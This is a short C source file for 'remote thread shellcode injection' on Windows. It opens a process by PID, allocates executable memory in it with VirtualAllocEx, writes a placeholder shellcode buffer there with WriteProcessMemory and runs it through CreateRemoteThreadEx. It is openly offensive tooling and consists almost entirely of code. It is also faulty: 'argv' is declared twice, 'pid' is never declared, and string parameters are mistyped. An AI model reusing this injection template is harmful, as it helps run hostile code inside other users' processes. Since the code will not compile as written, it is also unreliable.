/*                  Simple Remote Thread Shellcode Injection                               */


#include <windows.h>
#include <stdio.h>

void Fail (const char Failed_action){
    printf("[!] Failed with %s \n [!]Reason : %ld",Failed_action,GetLastError());
    exit(1);
}

void Success(HANDLE hndl,const char Succ_handle){
    printf("Got a handle of %s in 0x%p\n",Succ_handle , hndl);
}



int main (int argv, char* argv[]){

    HANDLE hProcess = NULL, hThread = NULL ; 
    DWORD dwPid, dwTid;
    PVOID pBuffer;

    unsigned char shellcode[]="\x41\x41\x41\x41";

    pid = atoi(argv[1]);

    hProcess = OpenProcess(
        PROCESS_ALL_ACCESS,
        FALSE,
        pid
    );

    if ( hProcess == NULL ){
        Fail("hPorcess");
    }

    Success(hProcess,"hProcess");

    pBuffer = VirtualAllocEx(             //  LPVOID VirtualAllocEx(
        hProcess,                         //    [in]           HANDLE hProcess
        NULL,                             //     [in, optional] LPVOID lpAddress,
        sizeof(shellcode),                //   [in]           SIZE_T dwSize,
        (MEM_COMMIT|MEM_RESERVE),         //   [in]           DWORD  flAllocationType,
        PAGE_EXECUTE_READWRITE);          //   [in]           DWORD  flProtect   );


    
    WriteProcessMemory(                     //  BOOL WriteProcessMemory(
            hProcess,                       //    [in]  HANDLE  hProcess,
            pBuffer,                        //    [in]  LPVOID  lpBaseAddress,
            shellcode,                      //    [in]  LPCVOID lpBuffer,
            sizeof(shellcode),              //    [in]  SIZE_T  nSize,
            NULL                            //    [out] SIZE_T  *lpNumberOfBytesWritten);
    );                                        

    hThread = CreateRemoteThreadEx(                  //HANDLE CreateRemoteThreadEx(
                hProcess,                            // HANDLE     hProcess,
                NULL,                                // LPSECURITY_ATTRIBUTES   lpThreadAttributes
                0,                                   // SIZE_T   dwStackSize,
                (LPTHREAD_START_ROUTINE) pBuffer,    // LPTHREAD_START_ROUTINE  lpStartAddress,
                NULL,                                // LPVOID  lpParameter,
                0,                                   // DWORD  dwCreationFlags,
                0,                                   // LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList,
                &dwTid);                             // LPDWORD   lpThreadId

    if (hThread == NULL){
        Fail("hThread");

    }

    WaitForSingleObject( hThread, INFINITE);


    return EXIT_SUCCESS;
    
}